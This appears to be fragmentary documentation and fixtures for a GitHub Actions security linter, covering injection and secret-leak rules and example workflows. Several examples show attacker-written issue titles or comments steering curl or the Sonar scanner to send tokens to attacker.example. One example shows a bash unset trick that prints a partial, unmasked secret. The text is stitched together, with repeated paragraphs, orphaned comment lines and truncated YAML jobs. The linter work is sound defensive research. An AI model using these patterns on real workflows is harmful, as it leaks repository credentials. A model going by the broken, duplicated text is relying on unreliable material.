GitHub's documents say that GitHub evaluates the policies before a run, and that a run that a policy does not allow fails with an error; the documents do not say whether a job of such a run starts before the run fails, and the rule assumes that no job starts.
notes.cause: unless a file of facts or --fact says that the Actions policies block runs on pull_request_target (repo.pull-request-target-allowed false), the rule reports the finding. When no file of facts and no --fact answers repo.pull-request-target-allowed, the finding is conditional.

false_positive_forms.text: a run that the Actions policies of the repository block, in four cases where the rule does not take the policies into account. First, an event policy that blocks an event of the attackers other than pull_request_target (such as issue_comment) in a workflow whose on has that event: the rules ask a fact only for pull_request_target. Second, an actor rule that does not allow the account of the attacker (for example, an actor rule that allows only the repository roles with write access): repo.pull-request-target-allowed is one value for all the runs of a workflow file on pull_request_target, and an actor rule blocks a run by the account that starts the run, so the fact cannot tell what an actor rule blocks. Third, a workflow whose on has pull_request_target and another event: the rule does not ask repo.pull-request-target-allowed for such a workflow, because a run on the other event can reach the job. When the if of the job is false on the other event, so that the job runs only on pull_request_target, and a policy blocks pull_request_target, the finding is a false positive. Fourth, a reusable workflow (on workflow_call) or an action that only workflows on pull_request_target call: the rule asks repo.pull-request-target-allowed only of a workflow whose on has pull_request_target, not of the reusable workflow or the action, so a finding in the reusable workflow or the action is still reported when the policies block the runs of every caller

#   run starts (the assumption of the reason), so nothing is written to

    steps:

        run: echo "body=$BODY" >> "$GITHUB_OUTPUT"

false_positive_forms.text: a run of status, check_suite or check_run in a repository where no app outside GitHub Actions makes a commit status or a check run for a commit that the attacker of the finding writes: the facts that the finding kind asks are false (repo.fork-pr-app-checks for a commit of a pull request from a fork, repo.merge-commit-app-checks for a commit that the merge of a pull request puts in a branch of the repository). In two cases, the rule does not ask these facts, and reports the finding whatever the values of the facts are. First, a workflow whose on has an event other than status, check_suite and check_run: the rule decides whether to ask the facts from the events of on alone, and does not read the if of the job, so the rule does not ask the facts even when the if of the job lets the job run only on status, check_suite or check_run. Second, a reusable workflow (on workflow_call) or an action (an action has no on) that only workflows on status, check_suite or check_run call: the rule asks the facts only of a workflow whose on has only events among these three, not of the reusable workflow or the action, so the rule reports a finding in the reusable workflow or the action whatever the values of the facts are

examples.name: app-checks-unasked.yml
examples.text:
# situation: on status and push, the job runs only on status (its if), and
#   writes the message of the commit of the status
#   (github.event.commit.commit.message) where the rule reads it.
# reason: no app outside GitHub Actions makes a commit status or a check run
#   for a commit whose message an attacker writes in the repository: no app
#   makes one for a commit of a pull request from a fork
#   (repo.fork-pr-app-checks false), and no app makes one for a commit that
#   the merge of a pull request puts in a branch
#   (repo.merge-commit-app-checks false), so no run of status has such a
#   commit, and the job does not run on push.
# cause: the rule asks repo.fork-pr-app-checks and
#   repo.merge-commit-app-checks only of a workflow whose on has no event
#   other than status, check_suite and check_run, and the on of this
#   workflow has push.
# attack-value: github.event.commit.commit.message = "a\nt=evil"
# attack-run-behavior: the author of a pull request from a fork writes the
#   value in the message of a commit; no app makes a status for the commit,
#   so no run of status starts with the value, and a push by one who can
#   write runs no job.
on: [status, push]
jobs:
  j:
    if: github.event_name == 'status'
    runs-on: ubuntu-latest
    steps:
      - run: echo "t=${{ github.event.commit.commit.message }}" >> "$GITHUB_OUTPUT"

notes.situation: on status and push, the job runs only on status (its if), and writes the message of the commit of the status (github.event.commit.commit.message) where the rule reads it.
notes.reason: no app outside GitHub Actions makes a commit status or a check run for a commit whose message an attacker writes in the repository: no app makes one for a commit of a pull request from a fork (repo.fork-pr-app-checks false), and no app makes one for a commit that the merge of a pull request puts in a branch (repo.merge-commit-app-checks false), so no run of status has such a commit, and the job does not run on push.
notes.cause: the rule asks repo.fork-pr-app-checks and repo.merge-commit-app-checks only of a workflow whose on has no event other than status, check_suite and check_run, and the on of this workflow has push.
notes.attack_run_behavior: the author of a pull request from a fork writes the value in the message of a commit; no app makes a status for the commit, so no run of status starts with the value, and a push by one who can write runs no job.

false_positive_forms.text: a workflow whose run GitHub does not start, or a job that GitHub fails in the step "Set up job", because of the setting of allowed actions of GitHub (the fact repo.allowed-actions, which the quality rule allowed-actions reads): GitHub does not start a run of a workflow that has a uses, or that calls a reusable workflow that has a uses, that the setting does not allow, and fails a job before any step of the job runs when a step of a composite action that the job runs has a uses that the setting does not allow, or when the setting requires a full commit SHA and a step names an action by a tag or a branch. The harm that the finding reports happens only when GitHub runs the workflow or the job, and the rule does not read repo.allowed-actions

examples.name: actions-not-allowed.yml
examples.text:
# situation: the workflow of the true positive controlled (controlled.yml)
#   of the rule, with a job added whose step uses
#   example-org/not-allowed-action, which the setting of allowed actions of
#   GitHub (repo.allowed-actions) blocks with
#   !example-org/not-allowed-action@*. In the true positive, on issues
#   opened, a step writes body= and the issue's body to $GITHUB_OUTPUT.
# reason: GitHub checks each uses of the workflow before the run starts, and
#   does not start the run because of the uses of
#   example-org/not-allowed-action: no job of the run runs, so what the
#   reason of the true positive says does not happen (in runs that the
#   authors of the rule made on GitHub, such runs ended as startup_failure).
# cause: the rule does not read repo.allowed-actions.
# attack-value: github.event.issue.body = "x\nPWNED=1"
# attack-run-behavior: GitHub does not start the run, so no step of the run
#   runs, and the attack does nothing.
on:
  issues:
    types: [opened]
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - env:
          BODY: ${{ github.event.issue.body }}
        run: echo "body=$BODY" >> "$GITHUB_OUTPUT"
  not-allowed:

false_positive_forms.text: a job that runs only for a pull request from a fork (pull_request, pull_request_review or pull_request_review_comment, with an if that compares github.event.pull_request.head.repo.fork with true, or github.event.pull_request.head.repo.full_name with github.repository), in a repository that is not a fork, in a run of the linter that adds variables-writer or secrets-writer: the rule reads each value of vars and secrets as a value that the attacker writes in every workflow run of the event; the workflow run for a pull request from a fork has no secret except GITHUB_TOKEN and a GITHUB_TOKEN that only reads, unless the settings of a private repository send secrets or a GITHUB_TOKEN that writes to such workflow runs (the facts repo.fork-pr-secrets and repo.fork-pr-write-tokens), and the attacker who writes a variable or a secret gets nothing from the job that the author of the pull request does not get from the code of the pull request. A job with no such if, in a repository where every pull request comes from a fork, is a false positive in the same way. The linter does not tell a workflow run for a pull request from a fork from a workflow run for a pull request from a branch of the repository. A fix: the linter splits the workflow runs of the three events into the runs for a pull request from a fork and the runs for a pull request from a branch of the repository, reads the comparisons of the if with the fork in each, and counts a run for a pull request from a fork only when the facts repo.fork-pr-secrets or repo.fork-pr-write-tokens say that the run gets secrets or a GITHUB_TOKEN that writes. A job with no such if keeps the runs for a pull request from a branch of the repository, and the finding stays. A fact of the rulesets of the repository (a ruleset with the rule Restrict creations on every branch and no actor that may bypass the ruleset) could say that no new branch, and so no pull request from a new branch, can be made, and remove a part of the false positives of a job with no such if; the actors that may bypass a ruleset, the branches made before the ruleset and the names of branches outside the patterns of the ruleset remain. The fix is not observed on GitHub

rules.problem: an attacker's value decides the host to which a command or an action sends a request. When the request carries a secret or the job's token, the attacker's server receives the secret or the token. When the job runs on a self-hosted runner, the request reaches services of the runner's network, with or without a credential
rules.expected: the workflow writes the host of every request, and any value an attacker controls appears only after the / that ends the host (https://api.example.com/<the value>)

actors.via: writes the title, the body or the branch name of a pull request from a fork, or the message, the author name or the committer name of a commit of the pull request
writes the title or the body of an issue or a discussion
writes a comment or a review
writes the message of a commit that is merged, or put in a merge queue
forks the repository, and names the fork
writes the title of a wiki page, where anyone may edit the wiki

preconditions.text: the request carries its credentials to the host its URL names: curl sends -H, -u, --oauth2-bearer, cookies and the body there, gh api sends GH_ENTERPRISE_TOKEN to any host not of GitHub and uses a full URL as it is, SonarSource's scanner sends SONAR_TOKEN to the sonar.host.url that args sets, and octokit/request-action sends its token to a full URL in route or to url

a self-hosted runner reaches services of its network that the attacker does not reach from outside, such as internal services and a cloud's metadata service; the organization that runs the runner decides that network, which is not checked

the job runs on an event whose payload has what an attacker wrote, with the token and the secrets of the repository: the attacker starts the run by an act of the attacker, or the act of another person or a schedule starts the run (run starters); not pull_request, whose run takes the workflow from the branch of the pull request: the author of the pull request can change the workflow of the pull request, so the author gets what the run has (read-only from a fork, or what a private repository sends to the runs of pull requests from forks) without the flaw of the rule

observed.what: a pull_request run took its workflow from the pull request's branch

preconditions.text: an app outside GitHub Actions, such as an outside CI, makes a commit status or a check run for a commit whose message an attacker writes (a commit of a pull request from a fork, or a commit that merges a pull request; the message of a commit that merges a pull request can have the title of the pull request), and the commit status or the check run starts a run of status, check_suite or check_run, which runs the workflow of the default branch, whatever branch the commit is on. The payload of a run of any of the three events has the SHA of the commit, and the payload of a run of status or check_suite also has the message, the author name and the committer name of the commit. A finding of a workflow whose on has only events among status, check_suite and check_run (one, two or all three) holds only when the fact of the commit is true: repo.fork-pr-app-checks for a commit of a pull request from a fork, and repo.merge-commit-app-checks for a commit that the merge of a pull request puts in a branch of the repository or that a merge queue of the repository makes. A finding kind asks the fact of each kind of commit that its attackers write; the finding of a finding kind that asks both facts holds when at least one of the two facts is true. The rule does not ask these facts of a workflow whose on has another event too, and reports the finding of such a workflow whatever the values of the facts are. The finding is conditional when no file of facts and no --fact answers the facts

observed.what: a GitHub App made a commit status and a check run for a commit of a pull request from a fork: runs of status, check_suite and check_run started on the default branch, and the message of the commit, with $( ) in it, was in commit.commit.message of status and in check_suite.head_commit.message of check_suite

the same again: the SHA of the commit of the pull request was in sha and commit.sha of status, check_suite.head_sha and check_suite.head_commit.id of check_suite, and check_run.head_sha and check_run.check_suite.head_sha of check_run; check_suite.after and check_suite.before were null; the author name and the committer name of the commit, with $( ) in each, were in the payloads of status and check_suite

preconditions.text: a reusable workflow or a composite action that is among the inputs runs on the events of the callers of the workflow or the action, whoever the callers are; when the inputs are the whole repository and hold every caller of the workflow or the action, the rule reads the workflow or the action on the events of the callers, with the values that the callers give under with

on gollum, an account with no role in the repository can edit the wiki only in a public repository whose settings let anyone with an account edit the wiki (the fact repo.wiki-open). undetected_forms.text: the summary of a wiki page (github.event.pages[*].summary) in a job that runs on gollum: the rule reads the summary as a value that nobody writes. The gollum payloads that the authors of the linter saw had a null summary each time: for pages made and edited on the web interface of GitHub and pushed by git, an edit message on the web interface and a commit message of git did not go into the summary. The authors saw only pages that the owner of a public repository made and edited, and did not try an edit by an account with no role in the repository

# situation: on gollum, a step sends a request with a secret to the host
#   that the summary of the wiki page names.
# reason: a limitation (run time): GitHub decides the summary of a wiki page
#   when the event happens. The gollum payloads that the authors of the
#   linter saw had a null summary each time, for pages made and edited on
#   the web interface and pushed by git; an edit by an account with no role
#   in the repository was not tried.
# cause: the rule reads the summary of a wiki page as a value that nobody
#   writes.
# attack-value: github.event.pages[0].summary = "attacker.example"
# attack-run-behavior: if GitHub ever put a summary that the editor of the
#   wiki writes in the payload, the summary would choose the host that gets
#   the secret.
on: gollum
permissions: {}
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - env:

          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}

undetected_forms.text: a job on pull_request_review or pull_request_review_comment that runs only for a pull request from a fork, such as a job whose if: condition is github.event.pull_request.head.repo.full_name != github.repository: the run of a review that the attacker writes on the pull request of another person from a fork has the secrets of the repository or a token that writes only where a private repository gives secrets or a token that writes to the runs of pull requests from forks (repo.fork-pr-secrets, repo.fork-pr-write-tokens). The rule does not read the facts repo.fork-pr-secrets and repo.fork-pr-write-tokens for the runs of a review, and does not count the run of a review of a pull request from a fork as a run of the attacker. When the attacker opened the pull request from a fork, a review of that pull request gives the attacker nothing more than the pull request itself gives: the run takes the workflow of the merge commit of the pull request (GitHub's documentation gives refs/pull/<n>/merge as the ref of the run of a review), and the attacker can change that workflow in the pull request

# situation: on comments on the diff, the comment's body is in the args of
#   sonarcloud-github-action with GITHUB_TOKEN and SONAR_TOKEN in its env,
#   in a job that runs only for a pull request from a fork.
# reason: a todo (a fact): the job runs only for a pull request from a
#   fork. Where a private repository gives secrets or a token that writes
#   to the runs of pull requests from forks, the run of a review that the
#   attacker writes on the pull request of another person from a fork has
#   those secrets or that token, and the job runs for the attacker.
# cause: the rule does not read the settings of a private repository for
#   the runs of pull requests from forks, and does not count the run of a
#   review of a pull request from a fork as a run of the attacker.
# attack-value: github.event.comment.body = "x -Dsonar.host.url=https://attacker.example/PWNED"
# attack-run-behavior: the comment of the attacker on the diff of the pull
#   request of another person from a fork starts the job a; the scanner
#   reads the value as a second option and sends SONAR_TOKEN to the host
#   of the attacker.
on: pull_request_review_comment
jobs:
  a:
    if: github.event.pull_request.head.repo.full_name != github.repository

      - uses: sonarsource/sonarcloud-github-action@master
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
        with:
          args: -Dsonar.pullrequest.key=${{ github.event.comment.body }}

undetected_forms.text: a value that an if compares with strings that the workflow writes in the if (strings compared by == with the value and joined by ||, or the strings of contains(fromJSON('[...]'), value)), where each string has only ASCII letters, digits, spaces, -, _, . and /, does not start with -, and has no - right after a space. The if of the job limits the value in every step of the job, and the if of a step with a run: script limits the value in that step only. In those steps the value equals one of the strings when the case of the letters is ignored, so the rule does not report the value. The attacker still chooses the case of each letter of the value. GitHub's server, which evaluates the if of a job, also takes the Kelvin sign as equal to the letter k and the long s as equal to the letter s; the runner, which evaluates the if of a step, takes the Kelvin sign as equal to the letter k. Where the case of a letter changes what the value names, such as a command, a variable, a file on a file system that tells names apart by their case (the default file system of a Linux runner), a host or a tool, the choice of the case can cause harm

examples.text:
# situation: on issue_comment, a job runs only when the comment's body is
#   hosts.example.com, and a step sends the repository's token to the host
#   that env.HOST, which holds the body, names.
# reason: the job's if lets the body be only the string hosts.example.com,
#   ignoring the case of its letters; GitHub's server, which evaluates the
#   if of a job, also takes the long s as equal to s. The author of this
#   example has not checked whether a host name with a long s names another
#   host than the name with s, and where curl sends the request.
# cause: the rule does not treat a value that the if of the job compares
#   with such a string as written by the attacker.
# attack-value: github.event.comment.body = "hoſts.example.com"
# attack-run-behavior: GitHub's server takes the value as equal to
#   hosts.example.com, so the job runs, and curl gets hoſts.example.com as
#   the host.
on:
  issue_comment:
    types: [created]
jobs:
  j:
    if: github.event.comment.body == 'hosts.example.com'
    runs-on: ubuntu-latest
    steps:
      - env:
          HOST: ${{ github.event.comment.body }}
        run: |
          curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" "https://$HOST/report"

# situation: the composite action sends a request with curl to the host the
#   title of an issue names, with inputs.token in an Authorization header;
#   ci.yml calls the action on issues and gives the secret DEPLOY_TOKEN as
#   token.
# reason: a todo (a file of the repository): anyone who can open an issue
#   writes the title, so the attacker names a host of the attacker's own, and
#   curl sends the header with the secret to the host.
# cause: the rule does not follow the value under with: of the caller into
#   inputs.token of the action, so the rule does not know that inputs.token
#   holds a secret.
# attack: the attacker opens an issue titled attacker.example, the host of a
#   server the attacker runs.
# attack-run-behavior: curl sends GET /status to attacker.example with
#   Authorization: Bearer and the value of DEPLOY_TOKEN, and the server of the
#   attacker logs the header.
name: status
description: check the status of the host
inputs:
  token:
    description: the token of the deploy
runs:
  using: composite
  steps:
    - env:
        DEPLOY_TOKEN: ${{ inputs.token }}
      run: |
        curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://${{ github.event.issue.title }}/status"
      shell: bash

# situation: on comments on the diff, the comment's body is in the args of
#   sonarcloud-github-action with GITHUB_TOKEN and SONAR_TOKEN in its env,
#   in a job that runs only when the head repository of the pull request
#   is a fork.
# reason: the job runs only when the head repository of the pull request
#   is a fork. On a pull request from a branch of the repository, the head
#   repository is the repository itself, so in a repository that is not a
#   fork the job runs only for a review of a pull request from a fork. In
#   a public repository, the run of such a review has no secrets and a
#   token that only reads; in a private repository, the run has neither
#   secrets nor a token that writes unless the repository gives secrets or
#   a token that writes to the runs of pull requests from forks (the
#   undetected form fork-review).
# cause: the rule does not read whether the repository that runs the
#   workflow (not the head repository of the pull request) is a fork, and
#   reads the job as if the job ran for a review of a pull request from a
#   branch of the repository.
# attack-value: github.event.comment.body = "x -Dsonar.host.url=https://attacker.example/PWNED"
# attack-run-behavior: in a public repository that is not a fork, a review
#   of a pull request from a branch of the repository does not start the
#   job, as the head repository of such a pull request is the repository
#   itself; a review of a pull request from a fork starts the job with no
#   secrets and a token that only reads, so the value reaches no secret
#   and no token that writes.

jobs:
  a:
    if: github.event.pull_request.head.repo.fork
    runs-on: ubuntu-latest

      - uses: sonarsource/sonarcloud-github-action@master
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
        with:
          args: -Dsonar.pullrequest.key=${{ github.event.comment.body }}

On a pull request from a branch of the repository, the head repository is the repository itself, so in a repository that is not a fork the job runs only for a review of a pull request from a fork. In a public repository, the run of such a review has no secrets and a token that only reads; in a private repository, the run has neither secrets nor a token that writes unless the repository gives secrets or a token that writes to the runs of pull requests from forks (the undetected form fork-review).

# situation: on issues, a step passes the issue's title in the environment
#   variable HOST, turns lastpipe on with shopt -s and the option name in a
#   variable, sets HOST to a fixed host in the last command of a pipeline,
#   and sends a request with curl and the secret DEPLOY_TOKEN to HOST.

#   shell that runs the pipeline, so HOST holds the fixed host when curl
#   runs, and the request goes to the fixed host.
# cause: the rule follows lastpipe only after shopt -s lastpipe written as
#   literal words, so the rule reads HOST as the value of the env.

#   server the attacker runs.

false_positive_forms.text: a value that an if compares with strings that the workflow writes in the if (strings compared by == with the value and joined by ||, or the strings of contains(fromJSON('[...]'), value)), where each string has only ASCII letters, digits, spaces, -, _, . and /, does not start with -, and has no - right after a space, where the rule reports the value although the if limits the value to those strings, because the rule does not read the if in one of three forms. (1) A reusable workflow or a composite action gets the value through an input, and the if of the calling job or the calling step compares the value. The rule reports the value in the file of the reusable workflow or the composite action. The value is harmless when the if of every caller of that file, inside and outside the repository, compares the value. (2) The if compares the value under one name, and the script writes the value under another name: for example, the if compares env.BODY, which the env of the step sets to ${{ github.event.comment.body }}, and the script writes ${{ github.event.comment.body }}; or the if compares ${{ github.head_ref }}, and the script writes ${{ github.event.pull_request.head.ref }}. The value is harmless when the two names hold the same value in the step; the rule does not check that the two names hold the same value. (3) The if of a step that uses an action compares a value that the with or the env of the same step holds. At the start of the job, the runner runs the pre step of each action from another repository whose action.yml has runs.pre, under the condition runs.pre-if of that action.yml and not under the if of the step. For the pre step, the runner evaluates the with and the env of the step, and the code of the pre step may read the inputs. The runner runs no pre step of a local action (./). The value is harmless when the action has no pre step, or when the code of the pre step does not read the value. In each form, the value is harmless only where the case of the letters does not change what the value names (the undetected form if-compared)

examples.name: if-unnarrowed.yml
examples.text:
# situation: on issue_comment created, a step that has the comment's body in
#   env.BODY runs only when env.BODY is deploy, and the step sends
#   the repository's token to the host that
#   ${{ github.event.comment.body }} names.
# reason: the step's if compares env.BODY, which holds the comment's body,
#   with deploy, so in the step the body is deploy, ignoring the case of its
#   letters: the body has no character that the shell reads as code, no
#   line break, no word that starts with - and no workflow command.
# cause: the rule limits a value by an if only under the name that the if
#   compares: the if compares env.BODY, and the script writes
#   ${{ github.event.comment.body }}; the rule does not check that env.BODY
#   holds the comment's body.
# attack-value: github.event.comment.body = "attacker.example"
# attack-run-behavior: on GitHub, the step's if is false for such a body,
#   and the runner skips the step.
on:
  issue_comment:
    types: [created]
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - if: env.BODY == 'deploy'
        env:
          BODY: ${{ github.event.comment.body }}
        run: |
          curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" "https://${{ github.event.comment.body }}/report"

notes.reason: the step's if compares env.BODY, which holds the comment's body, with deploy, so in the step the body is deploy, ignoring the case of its letters: the body has no character that the shell reads as code, no line break, no word that starts with - and no workflow command.
notes.cause: the rule limits a value by an if only under the name that the if compares: the if compares env.BODY, and the script writes ${{ github.event.comment.body }}; the rule does not check that env.BODY holds the comment's body.

false_positive_forms.text: a reusable workflow or a composite action when all of the following are true: the rule does not know all of the callers of the reusable workflow or the composite action; every workflow that runs the reusable workflow or the composite action (directly, or through another reusable workflow or composite action) is a workflow in the same repository; and the rule would report no finding of the finding kind if the rule read the reusable workflow or the composite action only on the events on which the workflows in the same repository run the reusable workflow or the composite action (for example, every workflow that runs the reusable workflow or the composite action runs only on push). When the rule does not know all of the callers, the rule can read the reusable workflow or the composite action on every event (the worst case). For example, the rule does not know all of the callers when no caller is among the inputs; when the inputs are not the whole repository; for a composite action, when an input is excluded or cannot be read; when a caller names the reusable workflow or the composite action by a name of the form owner/repo/path@ref instead of by a ./ path, in which owner/repo is the repository that the --repo flag names, or is any repository when no --repo flag is given; when a step names the composite action by a ./ path, and either no checkout step runs before that step or the last checkout step before that step is not a plain checkout step (a plain checkout step has no ref input, no repository input and no path input); when a step inside a composite action names another composite action by a ./ path; or when the rule does not know all of the callers of a caller

examples.name: callee.yml
examples.text:
# situation: a reusable workflow sends a request with curl and the secret
#   DEPLOY_TOKEN to the host github.event.issue.title names.
# reason: no harm when every caller runs on push: the issue it reads is
#   never an outsider's.
# cause: a callee is read in the worst case, as if a caller ran on issues.
# attack: the attacker opens an issue titled attacker.example, the host of a
#   server the attacker runs.
# attack-run-behavior: the callers in the repository run on push, whose
#   payload has no issue, so curl sends the request to an empty host and
#   fails.
on: workflow_call
jobs:
  j:
    runs-on: ubuntu-latest

false_positive_forms.text: a run that the Actions policies of the repository block, in four cases where the rule does not take the policies into account. First, an event policy that blocks an event of the attackers other than pull_request_target (such as issue_comment) in a workflow whose on has that event: the rules ask a fact only for pull_request_target. Second, an actor rule that does not allow the account of the attacker (for example, an actor rule that allows only the repository roles with write access): repo.pull-request-target-allowed is one value for all the runs of a workflow file on pull_request_target, and an actor rule blocks a run by the account that starts the run, so the fact cannot tell what an actor rule blocks. Third, a workflow whose on has pull_request_target and another event: the rule does not ask repo.pull-request-target-allowed for such a workflow, because a run on the other event can reach the job. When the if of the job is false on the other event, so that the job runs only on pull_request_target, and a policy blocks pull_request_target, the finding is a false positive. Fourth, a reusable workflow (on workflow_call) or an action that only workflows on pull_request_target call: the rule asks repo.pull-request-target-allowed only of a workflow whose on has pull_request_target, not of the reusable workflow or the action, so a finding in the reusable workflow or the action is still reported when the policies block the runs of every caller

false_positive_forms.text: a job that runs only for a pull request from a fork (pull_request, pull_request_review or pull_request_review_comment, with an if that compares github.event.pull_request.head.repo.fork with true, or github.event.pull_request.head.repo.full_name with github.repository), in a repository that is not a fork, in a run of the linter that adds variables-writer or secrets-writer: the rule reads each value of vars and secrets as a value that the attacker writes in every workflow run of the event; the workflow run for a pull request from a fork has no secret except GITHUB_TOKEN and a GITHUB_TOKEN that only reads, unless the settings of a private repository send secrets or a GITHUB_TOKEN that writes to such workflow runs (the facts repo.fork-pr-secrets and repo.fork-pr-write-tokens), and the attacker who writes a variable or a secret gets nothing from the job that the author of the pull request does not get from the code of the pull request. A job with no such if, in a repository where every pull request comes from a fork, is a false positive in the same way. The linter does not tell a workflow run for a pull request from a fork from a workflow run for a pull request from a branch of the repository. A fix: the linter splits the workflow runs of the three events into the runs for a pull request from a fork and the runs for a pull request from a branch of the repository, reads the comparisons of the if with the fork in each, and counts a run for a pull request from a fork only when the facts repo.fork-pr-secrets or repo.fork-pr-write-tokens say that the run gets secrets or a GITHUB_TOKEN that writes. A job with no such if keeps the runs for a pull request from a branch of the repository, and the finding stays. A fact of the rulesets of the repository (a ruleset with the rule Restrict creations on every branch and no actor that may bypass the ruleset) could say that no new branch, and so no pull request from a new branch, can be made, and remove a part of the false positives of a job with no such if; the actors that may bypass a ruleset, the branches made before the ruleset and the names of branches outside the patterns of the ruleset remain. The fix is not observed on GitHub

rules.problem: a request of the workflow carries a secret or the job's token to a destination the workflow names; whoever runs the server of the destination, or takes the server over, receives the secret or the token. Whether the destination is to be trusted with the secret is not in the workflow, so the finding holds until a file of facts says that the destination is trusted with the secret

GitHub decrypts the secrets to give them to the run, so a request to a host of GitHub gives GitHub nothing GitHub does not hold; the rule leaves out such a request, as it leaves out a service of the job and, on a GitHub-hosted runner, the runner itself (localhost), where only the job listens

true_negatives.name: untrusted-destination.never-runs.yml
true_negatives.text:
# situation: on push, the job whose id is disabled has if: false, and the job
#   whose id is on-failure needs the job build and has if: needs.build.result
#   == 'failure'; each of the two jobs sends the secret API_KEY with curl to
#   www.virustotal.com, and no facts file says that www.virustotal.com is
#   trusted with the secret.
# reason: GitHub skips the job disabled because the if of the job disabled is
#   false. The if of the job on-failure calls no status function, so GitHub
#   evaluates the if of the job on-failure only when the job build succeeded;
#   needs.build.result is then success, and the if is false. When the job
#   build fails or is skipped, GitHub skips the job on-failure without
#   evaluating the if. So neither job runs
#   (https://github.com/github/docs/blob/404a5f4de6cd5311e3ce2d5c076571291e0107d6/data/reusables/actions/jobs/section-using-conditions-to-control-job-execution.md).
# attack: whoever runs the server of www.virustotal.com, or takes the server
#   over, reads the requests that the server receives.
# attack-run-behavior: GitHub skips the job disabled and the job on-failure,
#   so curl does not run, and no request carries the secret API_KEY.
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo built
  disabled:
    if: false
    runs-on: ubuntu-latest
    steps:
      - shell: bash
        env:
          API_KEY: ${{ secrets.API_KEY }}
        run: |
          curl -fsS -H "x-apikey: $API_KEY" https://www.virustotal.com/api/v3/files -F file=@dist/app.zip
  on-failure:
    needs: build
    if: needs.build.result == 'failure'
    runs-on: ubuntu-latest
    steps:
      - shell: bash
        env:
          API_KEY: ${{ secrets.API_KEY }}
        run: |
          curl -fsS -H "x-apikey: $API_KEY" https://www.virustotal.com/api/v3/files -F file=@dist/app.zip

When the job build fails or is skipped, GitHub skips the job on-failure without evaluating the if. A piece of code is an action, which can read the secrets of every job, of any workflow, that runs the action, or code that an attacker writes, which can read the secrets of each job whose flaw runs the code of the attacker. In a job that names only the needed secrets, any piece of code that runs in the job can read every secret that the job names. The secrets are the secrets of the repository, of the organization of the repository and of the environment of the job. The observations of this rule did not check whether GitHub sends a job the secrets of the organization, so the form counts the secrets of the organization as if GitHub sends the job the secrets of the organization: counting more secrets keeps more jobs out of the form, and keeps out every job where a secret of the organization could cause the harm. #   environment.

#   DEV gets DEPLOY_TOKEN_PROD too. If each job named only the token that
#   the job picks, the job for PROD would still get DEPLOY_TOKEN_PROD and
#   would run the same action, and the action can read every secret that

Second, an actor rule that does not allow the account of the attacker (for example, an actor rule that allows only the repository roles with write access): repo.pull-request-target-allowed is one value for all the runs of a workflow file on pull_request_target, and an actor rule blocks a run by the account that starts the run, so the fact cannot tell what an actor rule blocks. Third, a workflow whose on has pull_request_target and another event: the rule does not ask repo.pull-request-target-allowed for such a workflow, because a run on the other event can reach the job. When the if of the job is false on the other event, so that the job runs only on pull_request_target, and a policy blocks pull_request_target, the finding is a false positive. Fourth, a reusable workflow (on workflow_call) or an action that only workflows on pull_request_target call: the rule asks repo.pull-request-target-allowed only of a workflow whose on has pull_request_target, not of the reusable workflow or the action, so a finding in the reusable workflow or the action is still reported when the policies block the runs of every caller

rules.problem: a value the shell made from a secret is printed to the log of the run; the runner registers the secret, each line of the secret and encoded forms of the secret such as the base64 of the secret, and masks only those strings
rules.expected: either no value made from a secret is printed, or each line of a value made from a secret is registered with ::add-mask:: before the value is printed

actors.via: reads the log of a run, or downloads the log

undetected_forms.text: a variable that a shell function unsets inside a recursive call of a function, where a function between the two calls made the variable local (f() { if [ -z "$inner" ]; then inner=1; h; else g; fi; }; h() { s=x; local s=y; f; }; g() { unset s; }): bash takes away the local of the nearest calling function that made the variable local, and the variable then holds the value from before the nearest calling function made the variable local; the rule reads the recursive call where the first call of the function runs, without the calls in between, and does not read the value that the unset reveals

examples.name: recursive-unset-local.yml
examples.text:
# situation: on push, in a public repository (repo.public true), a step
#   defines f, which calls h on the first call of f and calls g on the second
#   call of f; h sets s to the secret DEPLOY_TOKEN without the first character
#   of the secret, makes s local with safe, and calls f. g unsets s and prints
#   "token: " and $s.
# reason: a todo (the same file): in the second call of f, the unset in g
#   takes away the local that h made, and s holds the value that h set before
#   h made s local: the token without the first character, which the runner
#   does not mask.
# cause: the rule reads the second call of f, which f makes through h, where
#   the first call of f runs, without the call of h, so the rule does not read
#   the value that the unset reveals.
# attack: anyone who can read the run opens the log of the run and reads
#   the token without the first character.
# attack-run-behavior: the step prints "token: " and the token without the
#   first character.
on: push
permissions: {}
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
        run: |
          f() { if [ -z "$inner" ]; then inner=1; h; else g; fi; }
          g() { unset s; echo "token: $s"; }
          h() { s="${DEPLOY_TOKEN:1}"; local s=safe; f; }
          f

examples.text:
# situation: on push, a step passes the GITHUB_TOKEN to
#   canonical/get-workflow-version-action v1.0.0, whose exception output may
#   print a part of the token (GHSA-26wh-cc3r-w6pj: "the token may be
#   truncated—causing part of the GITHUB_TOKEN to be displayed in plaintext in
#   the GitHub Actions logs"). The job php is the form of GHSA-5wxr-w449-57cm:
#   shivammathur/setup-php before 2.37.1 with a pinned Composer version (tools:
#   composer:2.9.7) gives the GITHUB_TOKEN to Composer, which prints the token
#   when it rejects the format of the token. The job steam is the form of
#   GHSA-c5qx-p38x-qf5w and GHSA-mj96-mh85-r574: a step after the main step of
#   setup-steamcmd logs in with steamcmd, which saves the token of the Steam
#   account in config/config.vdf, and the post step of setup-steamcmd, which
#   runs at the end of the job after the later steps
#   (RageAgainstThePixel/setup-steamcmd v1.2.7, commit
#   ec536b530bd3bd059377d0d0c376c52c6b870de1, src/logging.ts lines 29 and 34),
#   prints the .vdf files; the action takes no secret as an input (its
#   action.yml has no inputs). The job vault is the form of
#   GHSA-4mgv-m5cm-f9h7: hashicorp/vault-action before 2.2.0 reads a secret
#   from Vault and, for a secret of several lines, "did not correctly handle
#   the marking of multi-line variables", so the runner does not mask the
